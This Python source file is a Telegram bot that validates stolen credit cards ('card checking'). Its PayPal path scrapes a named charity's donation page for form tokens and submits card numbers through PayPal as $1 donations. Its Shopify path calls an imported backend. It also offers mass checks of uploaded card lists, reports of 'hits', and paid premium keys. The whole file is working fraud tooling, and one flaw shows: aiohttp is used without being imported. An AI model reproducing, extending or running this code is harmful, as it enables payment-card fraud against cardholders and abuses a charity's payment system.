import asyncio
import os
import secrets
import string
import json
import time
import hashlib
import requests
import re
import base64
import urllib3
urllib3.disable_warnings()
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# --- IMPORT YOUR EXISTING SHOPIFY BACKEND ---
from api import process_card_async, parse_cc_string, extract_clean_response
from shopify import get_bin_info, classify_result, approved_message, fmt_price, fmt_info

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = os.getenv("ADMIN_ID", "YOUR_ADMIN_ID_HERE")

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USAGE_FILE = "usage.json" # New daily usage tracker database
ACTIVE_JOBS = {} 

# --- DATABASE LOGIC ---
def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if str(user_id) == str(ADMIN_ID): return "👑 ADMIN"
    db = load_db(PREMIUM_FILE)
    if str(user_id) in db:
        expiry = datetime.fromisoformat(db[str(user_id)])
        if datetime.now() < expiry: return "💎 PREMIUM"
        else:
            del db[str(user_id)]
            save_db(PREMIUM_FILE, db)
    return "🆓 FREE"

# --- USAGE LIMITER LOGIC ---
def get_usage(user_id):
    db = load_db(USAGE_FILE)
    today = datetime.now().strftime("%Y-%m-%d")
    uid = str(user_id)
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
        save_db(USAGE_FILE, db)
    return db[uid]

def add_usage(user_id, check_type):
    db = load_db(USAGE_FILE)
    uid = str(user_id)
    today = datetime.now().strftime("%Y-%m-%d")
    if uid not in db or db[uid].get("date") != today:
        db[uid] = {"date": today, "single": 0, "mass": 0}
    db[uid][check_type] += 1
    save_db(USAGE_FILE, db)

def can_use(user_id, check_type):
    """Returns True if user is allowed to perform the check"""
    tier = check_tier(user_id)
    if tier != "🆓 FREE": return True # Premium/Admin are unlimited
    
    usage = get_usage(user_id)
    if check_type == "single" and usage["single"] >= 10: return False
    if check_type == "mass" and usage["mass"] >= 1: return False
    return True

# --- FINITE STATE MACHINE (FSM) ---
class AppStates(StatesGroup):
    waiting_for_shopify = State()
    waiting_for_shopify_mass = State()
    waiting_for_paypal = State()
    waiting_for_paypal_mass = State()
    waiting_for_key = State()

# --- PAYPAL GATEWAY LOGIC ---
def check_cc_paypal(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4: return "ERROR", "Invalid Format"
       
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        us, user = generate_user_agent(), generate_user_agent()
        
        session = requests.Session()
        session.verify = False
        adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
            
        with session as r:
            headers_get = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': us}
            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=20)
            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                return "ERROR", "Cloudflare Block"
            
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
            
            if not all([m1, m2, m3, m4]): return "ERROR", "Page Load Error"
            
            id_form1, id_form2, nonec, enc = m1.group(1), m2.group(1), m3.group(1), m4.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            m_au = re.search(r'"accessToken":"(.*?)"', dec)
            if not m_au: return "ERROR", "Token Error"
            au = m_au.group(1)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2), 'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-minimum': (None, '1'), 'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec), 'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1'), 'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'xunarch'),
                'give_last': (None, 'xunarch'), 'give_email': (None, 'xunarch@gmail.com'),
                'card_name': (None, 'xunarch'), 'card_exp_month': (None, ''),
                'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {'content-type': data_multipart.content_type, 'user-agent': us}
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authorization': f'Bearer {au}', 'content-type': 'application/json',
                'user-agent': user, 'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835'
            }
            json_data_paypal = {
                'payment_source': {'card': {'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
                'application_context': {'vault': False}
            }
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=20, verify=False)
            
            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=20, verify=False)
            text_up = response.text.upper()

            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'THANK YOU FOR DONATION', '"SUCCESS":TRUE']):
                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up: return "CHARGED", "Thank you for donation"
            if 'INSUFFICIENT_FUNDS' in text_up: return "APPROVED", "INSUFFICIENT_FUNDS"
            elif 'CVV2_FAILURE' in text_up: return "APPROVED", "CVV2_FAILURE"
            elif 'INVALID_SECURITY_CODE' in text_up: return "APPROVED", "INVALID_SECURITY_CODE"
            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up: return "APPROVED", "3D_REQUIRED"
            elif 'DO_NOT_HONOR' in text_up: return "DECLINED", "Do not honor"
            elif 'GENERIC_DECLINE' in text_up: return "DECLINED", "GENERIC_DECLINE"
            else:
                try: return "DECLINED", str(response.json().get('data', {}).get('error', 'Transaction Failed'))
                except: return "DECLINED", "Transaction Failed"
                
    except Exception as e:
        msg = str(e)
        if "timeout" in msg.lower(): return "ERROR", "Read Timeout"
        return "ERROR", f"Req Error: {msg[:30]}"

# --- DYNAMIC UI MENUS ---
def kb_home(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    kb = [
        [InlineKeyboardButton(text="🟢 Shopify Gateway", callback_data="menu_shopify")],
        [InlineKeyboardButton(text="🔵 PayPal Gateway", callback_data="menu_paypal")],
        [InlineKeyboardButton(text="👤 My Profile", callback_data="ui_plan"),
         InlineKeyboardButton(text="🔑 Redeem Key", callback_data="ui_redeem")]
    ]
    if is_admin:
        kb.append([InlineKeyboardButton(text="⚙️ Admin Control Panel", callback_data="ui_admin")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def kb_shopify():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_shopify_single"),
         InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_shopify_mass")],
        [InlineKeyboardButton(text="🛑 Stop Mass Check", callback_data="cmd_stop")],
        [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
    ])

def kb_paypal():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Single Check", callback_data="ui_paypal_single"),
         InlineKeyboardButton(text="📁 Mass Check", callback_data="ui_paypal_mass")],
        [InlineKeyboardButton(text="🛑 Stop Mass Check", callback_data="cmd_stop")],
        [InlineKeyboardButton(text="🔙 Back to Dashboard", callback_data="ui_home")]
    ])

def kb_back():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]])

def kb_admin():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎟 Gen 1-Day", callback_data="gen_1d"), InlineKeyboardButton(text="🎟 Gen 7-Day", callback_data="gen_7d")],
        [InlineKeyboardButton(text="🎟 Gen 1-Month", callback_data="gen_30d"), InlineKeyboardButton(text="🎟 Gen Lifetime", callback_data="gen_life")],
        [InlineKeyboardButton(text="🔙 Return to Dashboard", callback_data="ui_home")]
    ])

async def clean_chat(message: Message):
    try: await message.delete()
    except TelegramBadRequest: pass

# --- MAIN DASHBOARD ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await clean_chat(message)
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except TelegramBadRequest: pass
    await state.clear()
    
    tier = check_tier(message.from_user.id)
    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
            f"Welcome, <b>{message.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>")
    new_msg = await message.answer(text, reply_markup=kb_home(message.from_user.id))
    await state.update_data(dash_id=new_msg.message_id)

@router.callback_query(F.data == "ui_home")
async def nav_home(callback: CallbackQuery, state: FSMContext):
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)

    tier = check_tier(callback.from_user.id)
    text = (f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\n"
            f"Welcome, <b>{callback.from_user.first_name}</b>.\nAccess Level: {tier}\n\n<i>Select a gateway below:</i>")
    await callback.message.edit_text(text, reply_markup=kb_home(callback.from_user.id))
    await callback.answer()

@router.callback_query(F.data == "menu_shopify")
async def menu_shopify(callback: CallbackQuery):
    await callback.message.edit_text("🟢 <b>SHOPIFY GATEWAY</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>Select a module to deploy:</i>", reply_markup=kb_shopify())
    await callback.answer()

@router.callback_query(F.data == "menu_paypal")
async def menu_paypal(callback: CallbackQuery):
    await callback.message.edit_text("🔵 <b>PAYPAL GATEWAY</b>\n━━━━━━━━━━━━━━━━━━\n\n<i>Select a module to deploy:</i>", reply_markup=kb_paypal())
    await callback.answer()

# --- SHOPIFY MODULES ---
@router.callback_query(F.data == "ui_shopify_single")
async def nav_shopify_single(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "single"):
        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 10 single checks per day. Redeem a premium key for unlimited checks.", show_alert=True)
    await callback.message.edit_text("🟢 <b>SHOPIFY: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_shopify)
    await callback.answer()

@router.callback_query(F.data == "ui_shopify_mass")
async def nav_shopify_mass(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "mass"):
        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 1 mass check per day. Redeem a premium key to remove limits.", show_alert=True)
    await callback.message.edit_text("🟢 <b>SHOPIFY: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_shopify_mass)
    await callback.answer()

@router.message(AppStates.waiting_for_shopify)
async def process_shopify(message: Message, state: FSMContext):
    await clean_chat(message)
    card_data = message.text.strip()
    try: parts = parse_cc_string(card_data)
    except ValueError:
        err = await message.answer("⚠️ <b>Invalid Format.</b> Use CC|MM|YYYY|CVV")
        await asyncio.sleep(2)
        await err.delete()
        return

    add_usage(message.from_user.id, "single") # Tick the counter

    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass

    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: Shopify Auto", reply_markup=kb_back())
    await state.update_data(dash_id=loading.message_id)

    try:
        success, raw_message, gateway, price, currency = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com", proxy_str=None)
        category = classify_result(success, raw_message)
        clean_msg = extract_clean_response(raw_message)
        if category == 'charged': clean_msg = 'ORDER_PLACED'

        status_emoji = "🔥 <b>CHARGED</b>" if category == 'charged' else "✅ <b>APPROVED</b>" if category == 'approved' else "❌ <b>DECLINED</b>"
        result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{clean_msg}</code>\nキ <b>Gateway:</b> {gateway or 'Shopify'}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
        await loading.edit_text(result_text, reply_markup=kb_back())
    except Exception as e:
        await loading.edit_text(f"⚠️ <b>Error:</b> {str(e)}", reply_markup=kb_back())

    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)

@router.message(AppStates.waiting_for_shopify_mass, F.document)
async def process_shopify_mass_file(message: Message, state: FSMContext):
    await clean_chat(message)
    user_id = message.from_user.id
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass

    file_id = message.document.file_id
    file_info = await bot.get_file(file_id)
    downloaded = await bot.download_file(file_info.file_path)
    
    ccs = downloaded.read().decode('utf-8').splitlines()
    ccs = [l.strip() for l in ccs if l.strip()]
    
    # Enforce limitations based on tier
    tier = check_tier(user_id)
    if tier == "🆓 FREE":
        if len(ccs) > 30:
            ccs = ccs[:30]
            warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards per file. Upgrading to Premium removes limits.")
            asyncio.create_task(delete_after_delay(warning, 5))
    else:
        if len(ccs) > 1000: ccs = ccs[:1000]

    add_usage(user_id, "mass") # Tick the counter
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
    ACTIVE_JOBS[job_id] = True
    total = len(ccs)
    prog_msg = await message.answer(f"🚀 <b>Shopify Mass Check Running</b> [ID: {job_id}]\nChecked: 0/{total}\n🔥 Charged: 0 | ✅ Approved: 0", reply_markup=kb_back())
    await state.update_data(dash_id=prog_msg.message_id)

    checked, approved, charged, declined = 0, 0, 0, 0
    
    async def process_single_shopify(cc):
        nonlocal checked, approved, charged, declined
        if not ACTIVE_JOBS.get(job_id): return
        try:
            parts = parse_cc_string(cc)
            success, raw_message, gateway, price, currency = await process_card_async(parts['cc'], parts['mes'], parts['ano'], parts['cvv'], "https://shop.spam.com", proxy_str=None)
            category = classify_result(success, raw_message)
            clean_msg = extract_clean_response(raw_message)
            if category == 'charged': clean_msg = 'ORDER_PLACED'

            checked += 1
            if category == "charged": charged += 1
            elif category == "approved": approved += 1
            else: declined += 1
            
            if category in ["charged", "approved"]:
                await message.answer(f"✅ <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: <code>{clean_msg}</code>")
        except Exception:
            checked += 1
            declined += 1

    sem = asyncio.Semaphore(5)
    async def sem_task(cc):
        async with sem: await process_single_shopify(cc)

    tasks = []
    for i, cc in enumerate(ccs):
        if not ACTIVE_JOBS.get(job_id): break
        tasks.append(asyncio.create_task(sem_task(cc)))
        if len(tasks) >= 5 or i == len(ccs)-1:
            await asyncio.gather(*tasks)
            tasks = []
            if ACTIVE_JOBS.get(job_id) and checked % 10 == 0:
                try: await prog_msg.edit_text(f"🚀 <b>Shopify Mass Check Running</b> [ID: {job_id}]\nChecked: {checked}/{total}\n🔥 Charged: {charged} | ✅ Approved: {approved}", reply_markup=kb_back())
                except: pass

    ACTIVE_JOBS.pop(job_id, None)
    await prog_msg.edit_text(f"🏁 <b>Shopify Mass Check Finished</b>\nChecked: {checked}/{total}\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}", reply_markup=kb_back())
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)


# --- PAYPAL MODULES ---
@router.callback_query(F.data == "ui_paypal_single")
async def nav_paypal_single(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "single"):
        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 10 single checks per day. Redeem a premium key for unlimited checks.", show_alert=True)
    await callback.message.edit_text("🔵 <b>PAYPAL: SINGLE CHECK</b>\n━━━━━━━━━━━━━━━━━━\n\nPaste card below.\nFormat: <code>CC|MM|YYYY|CVV</code>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_paypal)
    await callback.answer()

@router.callback_query(F.data == "ui_paypal_mass")
async def nav_paypal_mass(callback: CallbackQuery, state: FSMContext):
    if not can_use(callback.from_user.id, "mass"):
        return await callback.answer("⛔️ DAILY LIMIT REACHED!\n\nFree users get 1 mass check per day. Redeem a premium key to remove limits.", show_alert=True)
    await callback.message.edit_text("🔵 <b>PAYPAL: MASS CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease upload a <code>.txt</code> file containing your cards.\n<i>Format: CC|MM|YYYY|CVV</i>", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_paypal_mass)
    await callback.answer()

@router.message(AppStates.waiting_for_paypal)
async def process_paypal(message: Message, state: FSMContext):
    await clean_chat(message)
    card_data = message.text.strip()
    
    add_usage(message.from_user.id, "single") # Tick the counter

    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass

    loading = await message.answer(f"⏳ <b>AUTHORIZING...</b>\nTarget: <code>{card_data}</code>\nGateway: PayPal Braintree", reply_markup=kb_back())
    await state.update_data(dash_id=loading.message_id)

    status, response = await asyncio.to_thread(check_cc_paypal, card_data)
    status_emoji = "🔥 <b>CHARGED</b>" if status == "CHARGED" else "✅ <b>APPROVED</b>" if status == "APPROVED" else "❌ <b>DECLINED</b>"

    async with aiohttp.ClientSession() as session:
        brand, bank, country, level, type_cc, flag = await get_bin_info(session, card_data.split('|')[0][:6])

    result_text = (f"{status_emoji}\n━━━━━━━━━━━━━━━━━━\n💳 <b>Card:</b> <code>{card_data}</code>\nツ <b>Response:</b> <code>{response}</code>\nキ <b>Gateway:</b> PayPal Braintree\n零 <b>Info:</b> {fmt_info(brand, type_cc, level)}\n━━━━━━━━━━━━━━━━━━\n<i>Powered by BEAR OS</i>")
    await loading.edit_text(result_text, reply_markup=kb_back())

    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)

@router.message(AppStates.waiting_for_paypal_mass, F.document)
async def process_paypal_mass_file(message: Message, state: FSMContext):
    await clean_chat(message)
    user_id = message.from_user.id
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass

    file_id = message.document.file_id
    file_info = await bot.get_file(file_id)
    downloaded = await bot.download_file(file_info.file_path)
    
    ccs = downloaded.read().decode('utf-8').splitlines()
    ccs = [l.strip() for l in ccs if l.strip()]
    
    # Enforce limitations based on tier
    tier = check_tier(user_id)
    if tier == "🆓 FREE":
        if len(ccs) > 30:
            ccs = ccs[:30]
            warning = await message.answer("⚠️ <b>Free Tier Notice:</b> Mass check limited to 30 cards per file. Upgrading to Premium removes limits.")
            asyncio.create_task(delete_after_delay(warning, 5))
    else:
        if len(ccs) > 1000: ccs = ccs[:1000]

    add_usage(user_id, "mass") # Tick the counter
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:6].upper()
    ACTIVE_JOBS[job_id] = True
    
    total = len(ccs)
    prog_msg = await message.answer(f"🚀 <b>PayPal Mass Check Running</b> [ID: {job_id}]\nChecked: 0/{total}\n🔥 Charged: 0 | ✅ Approved: 0", reply_markup=kb_back())
    await state.update_data(dash_id=prog_msg.message_id)

    checked, approved, charged, declined = 0, 0, 0, 0
    
    async def process_single(cc):
        nonlocal checked, approved, charged, declined
        if not ACTIVE_JOBS.get(job_id): return
        status, response = await asyncio.to_thread(check_cc_paypal, cc)
        checked += 1
        if status == "CHARGED": charged += 1
        elif status == "APPROVED": approved += 1
        else: declined += 1
        if status in ["CHARGED", "APPROVED"]:
            await message.answer(f"✅ <b>Hit!</b>\nCard: <code>{cc}</code>\nRes: {response}")

    sem = asyncio.Semaphore(5)
    async def sem_task(cc):
        async with sem: await process_single(cc)

    tasks = []
    for i, cc in enumerate(ccs):
        if not ACTIVE_JOBS.get(job_id): break
        tasks.append(asyncio.create_task(sem_task(cc)))
        if len(tasks) >= 5 or i == len(ccs)-1:
            await asyncio.gather(*tasks)
            tasks = []
            if ACTIVE_JOBS.get(job_id) and checked % 10 == 0:
                try: await prog_msg.edit_text(f"🚀 <b>PayPal Mass Check Running</b> [ID: {job_id}]\nChecked: {checked}/{total}\n🔥 Charged: {charged} | ✅ Approved: {approved}", reply_markup=kb_back())
                except: pass

    ACTIVE_JOBS.pop(job_id, None)
    await prog_msg.edit_text(f"🏁 <b>PayPal Mass Check Finished</b>\nChecked: {checked}/{total}\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}", reply_markup=kb_back())
    dash_id = (await state.get_data()).get("dash_id")
    await state.clear()
    if dash_id: await state.update_data(dash_id=dash_id)


# --- GENERAL UTILITIES ---
async def delete_after_delay(message: Message, delay: int):
    await asyncio.sleep(delay)
    try: await message.delete()
    except: pass

@router.callback_query(F.data == "cmd_stop")
async def stop_mass(callback: CallbackQuery):
    if check_tier(callback.from_user.id) == "🆓 FREE": 
        return await callback.answer("⛔️ PREMIUM EXCLUSIVE!", show_alert=True)
    for job in list(ACTIVE_JOBS.keys()): ACTIVE_JOBS[job] = False
    await callback.answer("🛑 Sent stop signal to all mass checks.", show_alert=True)

@router.callback_query(F.data == "ui_redeem")
async def nav_redeem(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔑 <b>KEY REDEMPTION</b>\n━━━━━━━━━━━━━━━━━━\n\nPlease paste your license key in the chat.", reply_markup=kb_back())
    await state.set_state(AppStates.waiting_for_key)
    await callback.answer()

@router.message(AppStates.waiting_for_key)
async def process_key(message: Message, state: FSMContext):
    await clean_chat(message)
    key_input = message.text.strip().upper()
    keys_db = load_db(KEYS_FILE)
    if key_input not in keys_db:
        warning = await message.answer("❌ <b>Invalid or Expired Key.</b>")
        asyncio.create_task(delete_after_delay(warning, 3))
        return

    duration = keys_db[key_input]
    if duration == 'life': expiry = datetime.now() + timedelta(days=36500)
    elif duration.endswith('d'): expiry = datetime.now() + timedelta(days=int(duration[:-1]))
    elif duration.endswith('m'): expiry = datetime.now() + timedelta(days=int(duration[:-1])*30)
    
    prem_db = load_db(PREMIUM_FILE)
    prem_db[str(message.from_user.id)] = expiry.isoformat()
    save_db(PREMIUM_FILE, prem_db)
    del keys_db[key_input]
    save_db(KEYS_FILE, keys_db)
    
    data = await state.get_data()
    if data.get("dash_id"):
        try: await bot.delete_message(chat_id=message.chat.id, message_id=data.get("dash_id"))
        except: pass

    success = await message.answer(f"🎉 <b>Redeemed!</b> You have Premium until {expiry.strftime('%Y-%m-%d')}")
    await state.clear()
    
    new_dash = await message.answer(f"⚡️ <b>BEAR CHECKER OS</b> ⚡️\n━━━━━━━━━━━━━━━━━━\n\nAccess Level: 💎 PREMIUM\n\n<i>Select a gateway below:</i>", reply_markup=kb_home(message.from_user.id))
    await state.update_data(dash_id=new_dash.message_id)
    asyncio.create_task(delete_after_delay(success, 4))

@router.callback_query(F.data == "ui_plan")
async def nav_plan(callback: CallbackQuery):
    tier = check_tier(callback.from_user.id)
    db = load_db(PREMIUM_FILE)
    if str(callback.from_user.id) == str(ADMIN_ID): expiry_text = "Never (Admin Override)"
    elif str(callback.from_user.id) in db: expiry_text = datetime.fromisoformat(db[str(callback.from_user.id)]).strftime('%Y-%m-%d %H:%M:%S')
    else: expiry_text = "N/A"

    usage_text = ""
    if tier == "🆓 FREE":
        usage = get_usage(callback.from_user.id)
        usage_text = f"\n<b>Daily Single Checks:</b> {usage['single']}/10\n<b>Daily Mass Checks:</b> {usage['mass']}/1\n"

    await callback.message.edit_text(f"👤 <b>USER PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Telegram ID:</b> <code>{callback.from_user.id}</code>\n<b>Access Level:</b> {tier}\n<b>Expires On:</b> <code>{expiry_text}</code>\n{usage_text}\n<i>To upgrade, click Redeem Key.</i>", reply_markup=kb_back())
    await callback.answer()

@router.callback_query(F.data == "ui_admin")
async def nav_admin(callback: CallbackQuery):
    if str(callback.from_user.id) != str(ADMIN_ID): return await callback.answer("⛔️ Unauthorized.", show_alert=True)
    await callback.message.edit_text("⚙️ <b>ADMIN TERMINAL</b>\n━━━━━━━━━━━━━━━━━━\n\nGenerate access keys below:", reply_markup=kb_admin())
    await callback.answer()

@router.callback_query(F.data.startswith("gen_"))
async def admin_gen(callback: CallbackQuery):
    if str(callback.from_user.id) != str(ADMIN_ID): return
    duration = callback.data.split("_")[1]
    new_key = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
    db = load_db(KEYS_FILE)
    db[new_key] = duration
    save_db(KEYS_FILE, db)
    await callback.message.edit_text(f"🎟 <b>LICENSE CREATED</b>\n━━━━━━━━━━━━━━━━━━\n\n<b>Key:</b> <code>{new_key}</code>\n<b>Duration:</b> {duration.upper()}\n\n<i>Tap the key to copy it.</i>", reply_markup=kb_back())
    await callback.answer()

async def main():
    print("BEAR OS Backend Online...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
